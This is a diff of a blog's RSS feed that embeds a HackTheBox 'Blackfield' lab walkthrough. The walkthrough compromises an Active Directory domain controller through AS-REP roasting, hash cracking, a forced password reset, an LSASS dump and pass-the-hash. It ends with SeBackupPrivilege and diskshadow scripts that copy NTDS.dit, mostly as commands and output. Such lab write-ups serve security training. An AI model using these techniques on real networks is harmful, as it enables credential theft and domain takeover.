@@ -1,17 +1,17 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
-    <title>Backup-operators on Ef&#39;s log</title>
+    <title>backup-operators on Ef&#39;s log</title>
     <link>https://fahmifj.github.io/tags/backup-operators/</link>
-    <description>Recent content in Backup-operators on Ef&#39;s log</description>
+    <description>Recent content in backup-operators on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
     <lastBuildDate>Tue, 04 May 2021 14:28:21 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/backup-operators/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Blackfield</title>
-      <link>https://fahmifj.github.io/hackthebox/blackfield/</link>
+      <link>https://fahmifj.github.io/ctf/hackthebox/blackfield/</link>
       <pubDate>Tue, 04 May 2021 14:28:21 +0700</pubDate>
       
-      <guid>https://fahmifj.github.io/hackthebox/blackfield/</guid>
+      <guid>https://fahmifj.github.io/ctf/hackthebox/blackfield/</guid>
       <description>Abusing Backup Operators group to dump Active Directory database</description>
       <content:encoded><![CDATA[<p>Blackfield begins with collecting a list of usernames from an SMB share. With these usernames, I&rsquo;m able to perform AS-REP roasting attack and obtain a TGT of a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds a memory dump file of LSASS. The dump file contains an NT hash of a service account that is a member of Backup Operators. The privileges of the Backup Operators group can be abused to create a volume shadow copy and pull the <code>NTDS.dit</code> file from there. The <code>NTDS.dit</code> file can be extracted to retrieve the NT hash of the administrator account, and that hash can be used for remote access with administrative privilege.</p>
 <h4 id="skills-learned">Skills Learned</h4>
@@ -37,7 +37,8 @@
 <h2 id="reconnaissance">Reconnaissance</h2>
 <h3 id="nmap">Nmap</h3>
 <p>An initial TCP scan with <code>nmap</code> discovers at least seven open ports. These ports are the typical port used by Active Directory Domain Controller (AD DC).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ nmap -sC -sV -oN initial-blackfield 10.10.10.192
 </span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> blackfield.htb <span class="o">(</span>10.10.10.192<span class="o">)</span>
 </span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.054s latency<span class="o">)</span>.
@@ -66,8 +67,8 @@
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_ Message signing enabled and required
 </span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
 </span></span><span class="line"><span class="cl"><span class="p">|</span> date: 2020–10–04T10:55:58
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_ start_date: N/A
-</span></span></code></pre></div><p>I will summarize the results:</p>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ start_date: N/A</span></span></code></pre>
+</figure><p>I will summarize the results:</p>
 <ul>
 <li>There is a DNS service on port 53, but HTB box is a single machine, so enumerating this service is not priority.</li>
 <li>There is a Kerberos service on port 88 is running Kerberos. I can try AS-REP roasting here.</li>
@@ -82,15 +83,16 @@
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
 <p>On LDAP, I can send a query to obtain the domain metadata, but first I&rsquo;ll look into the rootDSE<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> to retrieve a list of the domain naming context.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.192 -s base namingContexts
 </span></span><span class="line"><span class="cl">dn:
 </span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">DC</span><span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
 </span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
 </span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
 </span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
-</span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
-</span></span></code></pre></div><ul>
+</span></span><span class="line"><span class="cl">namingcontexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span>local</span></span></code></pre>
+</figure><ul>
 <li>
 <p><code>-LLL</code>: removes every comments in the output</p>
 </li>
@@ -108,13 +110,15 @@
 <p>I can use <code>DC=BLACKFIELD,DC=local</code> (this is called as <em>distinguished name</em>), but unfortunately the anonymous bind is not allowed.</p>
 <h3 id="tcp-445---smb">TCP 445 - SMB</h3>
 <p>Trying anonymous login with <code>crackmapexec</code> returns a status access denied.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.192 -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
 </span></span><span class="line"><span class="cl">SMB         10.10.10.192    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
 </span></span><span class="line"><span class="cl">SMB         10.10.10.192    <span class="m">445</span>    DC01             <span class="o">[</span>-<span class="o">]</span> BLACKFIELD.local<span class="se">\:</span> STATUS_ACCESS_DENIED
-</span></span><span class="line"><span class="cl">SMB         10.10.10.192    <span class="m">445</span>    DC01             <span class="o">[</span>-<span class="o">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
-</span></span></code></pre></div><p>But on using <code>smbclient</code>, it return the shares list.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+</span></span><span class="line"><span class="cl">SMB         10.10.10.192    <span class="m">445</span>    DC01             <span class="o">[</span>-<span class="o">]</span> Error enumerating shares: STATUS_ACCESS_DENIED</span></span></code></pre>
+</figure><p>But on using <code>smbclient</code>, it return the shares list.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.192/
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        Sharename       Type      Comment
@@ -128,8 +132,8 @@
 </span></span><span class="line"><span class="cl">        SYSVOL          Disk      Logon server share
 </span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
 </span></span><span class="line"><span class="cl">do_connect: Connection <span class="k">for</span> 10.10.10.192 failed <span class="o">(</span>Error NT_STATUS_IO_TIMEOUT<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available
-</span></span></code></pre></div><p>Later, I came to know that ‘anonymous’ must be specified in <code>crackmapexec</code>.</p>
+</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available</span></span></code></pre>
+</figure><p>Later, I came to know that ‘anonymous’ must be specified in <code>crackmapexec</code>.</p>
 <p><div class="img-container"><img src="imgs/image-20210504155151284.png" alt="image-20210504155151284"  /></div>
 </p>
 <h4 id="profiles-share">profiles$ share</h4>
@@ -137,7 +141,8 @@
 <p><div class="img-container"><img src="imgs/image-20210504155638689.png" alt="image-20210504155638689"  /></div>
 </p>
 <p>I can convert these folders name to list of username using <code>awk '{print $1}'</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ cat folder.list <span class="p">|</span> awk <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> tee users.list
 </span></span><span class="line"><span class="cl">AAlleni
 </span></span><span class="line"><span class="cl">ABarteski
@@ -145,26 +150,30 @@
 </span></span><span class="line"><span class="cl">ABenzies
 </span></span><span class="line"><span class="cl">ABiemiller
 </span></span><span class="line"><span class="cl">AChampken
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span></code></pre></div><p>Now that I have a list of usernames, I can try AS-REP roast attack.</p>
+</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...</span></span></code></pre>
+</figure><p>Now that I have a list of usernames, I can try AS-REP roast attack.</p>
 <h3 id="tcp-88---kerberos">TCP 88 - Kerberos</h3>
 <h4 id="as-rep-roasting">AS-REP roasting</h4>
 <p>I&rsquo;ll use <code>GetNPUsers.py</code> to perform AS-REP roasting on Kerberos.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
-</span></span><span class="line"><span class="cl">$ GetNPUsers.py BLACKFIELD.LOCAL/ -no-pass -usersfile users.list -dc-ip 10.10.10.192 -outputfile TGT_AS-REP
-</span></span></code></pre></div><p>And I will watch the output file using <code>watch</code> command</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
-</span></span><span class="line"><span class="cl">$ watch -n <span class="m">1</span> cat TGT_AS-REP
-</span></span></code></pre></div><p>After a few minutes, it captures the hash for user <code>support</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+</span></span><span class="line"><span class="cl">$ GetNPUsers.py BLACKFIELD.LOCAL/ -no-pass -usersfile users.list -dc-ip 10.10.10.192 -outputfile TGT_AS-REP</span></span></code></pre>
+</figure><p>And I will watch the output file using <code>watch</code> command</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+</span></span><span class="line"><span class="cl">$ watch -n <span class="m">1</span> cat TGT_AS-REP</span></span></code></pre>
+</figure><p>After a few minutes, it captures the hash for user <code>support</code>.</p>
 <p><div class="img-container"><img src="imgs/image-20210504160338371.png" alt="image-20210504160338371"  /></div>
 </p>
 <p>I&rsquo;ll send the hash to my Windows for cracking.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ cat TGT_AS-REP
-</span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$23$support</span>@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4<span class="nv">$821</span>c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805
-</span></span></code></pre></div><h3 id="cracking-the-hash">Cracking the Hash</h3>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$23$support</span>@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4<span class="nv">$821</span>c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805</span></span></code></pre>
+</figure><h3 id="cracking-the-hash">Cracking the Hash</h3>
 <p>I&rsquo;ll use dictionary attack to recover the user password using <code>hashcat</code>, and it cracks within a few seconds.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\t</span>ools<span class="se">\h</span>ashcat6&gt; hashcat -m <span class="m">18200</span> hashes/blackfield.hash rockyou.txt -O
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\t</span>ools<span class="se">\h</span>ashcat6&gt; hashcat -m <span class="m">18200</span> hashes/blackfield.hash rockyou.txt -O
 </span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
@@ -174,21 +183,22 @@
 </span></span><span class="line"><span class="cl">Status...........: Cracked
 </span></span><span class="line"><span class="cl">Hash.Name........: Kerberos 5, etype 23, AS-REP
 </span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$krb5asrep$23$support</span>@BLACKFIELD.LOCAL:55211d2eb15e...3ab805
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span></code></pre></div><p>The password for user <code>support</code> is <code>#00^BlackKnight</code>.</p>
+</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...</span></span></code></pre>
+</figure><p>The password for user <code>support</code> is <code>#00^BlackKnight</code>.</p>
 <h3 id="access-as-support">Access as support</h3>
 <p>Now that I obtained a set of credentials, I can re-enumerate the available services.</p>
 <h4 id="ldap-domain-dump">LDAP Domain Dump</h4>
 <p>The credentials works on LDAP, I can use it to obtain the domain info using <a href="https://github.com/dirkjanm/ldapdomaindump"target="_blank" rel="noopener noreferrer"
 >ldapdomaindump</a>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ ldapdomaindump -u <span class="s1">&#39;BLACKFIELD.LOCAL\support&#39;</span> -p <span class="s1">&#39;#00^BlackKnight&#39;</span> -no-json -no-grep 10.10.10.192
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to host...
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Binding to host
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting domain dump
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Domain dump finished
-</span></span></code></pre></div><p>The output from the tool are formatted in HTML document, and I get the following information:</p>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Domain dump finished</span></span></code></pre>
+</figure><p>The output from the tool are formatted in HTML document, and I get the following information:</p>
 <p>The OS information and the computer FQDN.</p>
 <p><div class="img-container"><img src="imgs/image-20210504162822528.png" alt="image-20210504162822528"  /></div>
 </p>
@@ -210,9 +220,10 @@
 <p>From here, I know that user <code>support</code> does not have remote shell access.</p>
 <h4 id="bloodhound">BloodHound</h4>
 <p>There is a python-based ingestor for <code>BloodHound</code> besides <code>SharpHound</code>. It can be used remotely from Linux.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
-</span></span><span class="line"><span class="cl">$ python bloodhound.py -c All -u <span class="s1">&#39;support@blackfield.local&#39;</span> -p <span class="s1">&#39;#00^BlackKnight&#39;</span> -d blackfield.local -dc DC01.BLACKFIELD.local -ns 10.10.10.192
-</span></span></code></pre></div><ul>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
+</span></span><span class="line"><span class="cl">$ python bloodhound.py -c All -u <span class="s1">&#39;support@blackfield.local&#39;</span> -p <span class="s1">&#39;#00^BlackKnight&#39;</span> -d blackfield.local -dc DC01.BLACKFIELD.local -ns 10.10.10.192</span></span></code></pre>
+</figure><ul>
 <li><code>-c</code>: collect method : all</li>
 <li><code>-u</code>,<code>-p</code>: credentials set</li>
 <li><code>-d</code>: domain name</li>
@@ -220,7 +231,8 @@
 <li><code>-ns</code>: name server / DNS</li>
 </ul>
 <p>It returns the following output:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">INFO: Found AD domain: blackfield.local
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">INFO: Found AD domain: blackfield.local
 </span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: DC01.BLACKFIELD.local
 </span></span><span class="line"><span class="cl">INFO: Found 1 domains
 </span></span><span class="line"><span class="cl">INFO: Found 1 domains in the forest
@@ -232,8 +244,8 @@
 </span></span><span class="line"><span class="cl">INFO: Found 0 trusts
 </span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with 10 workers
 </span></span><span class="line"><span class="cl">INFO: Querying computer: DC01.BLACKFIELD.local
-</span></span><span class="line"><span class="cl">INFO: Done in 00M 18S
-</span></span></code></pre></div><p>The output files from the tool are in json format. They are: <code>computers.json</code>, <code>domains.json</code>, <code>groups.json</code> and <code>users.json</code>.</p>
+</span></span><span class="line"><span class="cl">INFO: Done in 00M 18S</span></span></code></pre>
+</figure><p>The output files from the tool are in json format. They are: <code>computers.json</code>, <code>domains.json</code>, <code>groups.json</code> and <code>users.json</code>.</p>
 <p>I can upload these files to <code>BloodHound</code> GUI by drag and drop.</p>
 <p><div class="img-container"><img src="imgs/image-20210504165340110.png" alt="image-20210504165340110"  /></div>
 </p>
@@ -242,13 +254,15 @@
 </p>
 <h4 id="reset-audit2020-password">Reset Audit2020 Password</h4>
 <p>I can change the user <strong>audit2020</strong> password using <code>net rpc</code><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. I&rsquo;ll set <code>P@$$w0rd!</code> as the new password for user <strong>audit2020</strong>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ net rpc password audit2020 -U <span class="s1">&#39;support%#00^BlackKnight&#39;</span> -S 10.10.10.192
-</span></span><span class="line"><span class="cl">Enter new password <span class="k">for</span> audit2020: 
-</span></span></code></pre></div><h3 id="access-as-audit2020">Access as Audit2020</h3>
+</span></span><span class="line"><span class="cl">Enter new password <span class="k">for</span> audit2020: </span></span></code></pre>
+</figure><h3 id="access-as-audit2020">Access as Audit2020</h3>
 <h4 id="forensic-share">forensic share</h4>
 <p>With <strong>audit2020</strong>, I can access the forensic share.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ smbmap -H 10.10.10.192 -u audit2020 -p <span class="s1">&#39;P@$$w0rd!&#39;</span> 
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.192:445        Name: BLACKFIELD.local
 </span></span><span class="line"><span class="cl">        Disk                                                    Permissions     Comment
@@ -259,9 +273,10 @@
 </span></span><span class="line"><span class="cl">        IPC$                                                    READ ONLY       Remote IPC
 </span></span><span class="line"><span class="cl">        NETLOGON                                                READ ONLY       Logon server share
 </span></span><span class="line"><span class="cl">        profiles$                                               READ ONLY
-</span></span><span class="line"><span class="cl">        SYSVOL                                                  READ ONLY       Logon server share
-</span></span></code></pre></div><p>Inside the share, there is three folders, and I&rsquo;ll download all of them to my Kali.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+</span></span><span class="line"><span class="cl">        SYSVOL                                                  READ ONLY       Logon server share</span></span></code></pre>
+</figure><p>Inside the share, there is three folders, and I&rsquo;ll download all of them to my Kali.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ smbclient -U <span class="s1">&#39;audit2020%P@$$w0rd!&#39;</span>//10.10.10.192/forensic 
 </span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
 </span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
@@ -271,12 +286,13 @@
 </span></span><span class="line"><span class="cl">  memory_analysis                     D        <span class="m">0</span>  Fri May <span class="m">29</span> 03:28:33 <span class="m">2020</span>
 </span></span><span class="line"><span class="cl">  tools                               D        <span class="m">0</span>  Sun Feb <span class="m">23</span> 20:39:08 <span class="m">2020</span>
 </span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> recurse on
-</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget *
-</span></span></code></pre></div><p>Enumerating on the memory_analysis folder, there is a file called <code>lsass.zip</code> that contains <code>lsass.DMP</code> which is interesting to me.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget *</span></span></code></pre>
+</figure><p>Enumerating on the memory_analysis folder, there is a file called <code>lsass.zip</code> that contains <code>lsass.DMP</code> which is interesting to me.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ file lsass.DMP
-</span></span><span class="line"><span class="cl">lsass.DMP: Mini DuMP crash report, <span class="m">16</span> streams, Sun Feb <span class="m">23</span> 18:02:01 2020, 0x421826 <span class="nb">type</span>
-</span></span></code></pre></div><blockquote>
+</span></span><span class="line"><span class="cl">lsass.DMP: Mini DuMP crash report, <span class="m">16</span> streams, Sun Feb <span class="m">23</span> 18:02:01 2020, 0x421826 type</span></span></code></pre>
+</figure><blockquote>
 <p>LSASS (Local Security Authentication Subsystem Service) is a service/process that used to verify and authenticate users on login to a Windows computer. In other words, it holds the Windows credentials.</p>
 </blockquote>
 <h2 id="foothold">Foothold</h2>
@@ -289,9 +305,10 @@
 <h4 id="winrm---svc_backup">WinRM - svc_backup</h4>
 <p>I knew that this user can login remotely (from <a href="#ldap-domain-dump"target="_blank" rel="noopener noreferrer"
 >LDAP</a>), so I can try it with <code>evil-winrm</code>, and it worked.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
-</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.192 -u svc_backup -H <span class="s1">&#39;9658d1d1dcd9250115e2205d9f48400d&#39;</span>
-</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210504173749952.png" alt="image-20210504173749952"  /></div>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
+</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.192 -u svc_backup -H <span class="s1">&#39;9658d1d1dcd9250115e2205d9f48400d&#39;</span></span></span></code></pre>
+</figure><p><div class="img-container"><img src="imgs/image-20210504173749952.png" alt="image-20210504173749952"  /></div>
 </p>
 <p>User flag is done here.</p>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
@@ -309,17 +326,20 @@
 <h4 id="abusing-sebackupprivilege">Abusing SeBackupPrivilege</h4>
 <p>I&rsquo;ll create a few scripts to perform all the needed actions (create a volume, grab <code>ntds.dit</code>, and cleanup the volume shadow) in one run.</p>
 <p>The first one is the script for grabbing <code>NTDS.dit</code> file, I will save it as <code>copy.cmd</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
-</span></span></code></pre></div><p>The next one is the script for creating and deleting the volume shadow, I will save it as <code>script.txt</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">set context persistent nowriters 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;</span></span></code></pre>
+</figure><p>The next one is the script for creating and deleting the volume shadow, I will save it as <code>script.txt</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">set context persistent nowriters 
 </span></span><span class="line"><span class="cl">add volume c: alias iamf 
 </span></span><span class="line"><span class="cl">create 
 </span></span><span class="line"><span class="cl">expose %iamf% f: 
 </span></span><span class="line"><span class="cl">exec &#34;copy.cmd&#34; 
 </span></span><span class="line"><span class="cl">delete shadows volume %iamf% 
-</span></span><span class="line"><span class="cl">reset
-</span></span></code></pre></div><p>After that, I will move the modules and the scripts into a folder called <code>exploits</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «exploits» «10.10.14.169»
+</span></span><span class="line"><span class="cl">reset</span></span></code></pre>
+</figure><p>After that, I will move the modules and the scripts into a folder called <code>exploits</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «exploits» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ tree
 </span></span><span class="line"><span class="cl">.
 </span></span><span class="line"><span class="cl">├── SeBackupPrivilegeCmdLets.dll
@@ -327,9 +347,10 @@
 </span></span><span class="line"><span class="cl">├── copy.cmd
 </span></span><span class="line"><span class="cl">└── script.txt
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="m">0</span> directories, <span class="m">4</span> files
-</span></span></code></pre></div><p>Now, I’ll copy these <code>.dll</code> modules, <code>copy.cmd</code>, and <code>script.txt</code> to Blackfield using the upload feature from <code>evil-winrm</code> at <code>C:\temp\</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «exploits» «10.10.14.169»
+</span></span><span class="line"><span class="cl"><span class="m">0</span> directories, <span class="m">4</span> files</span></span></code></pre>
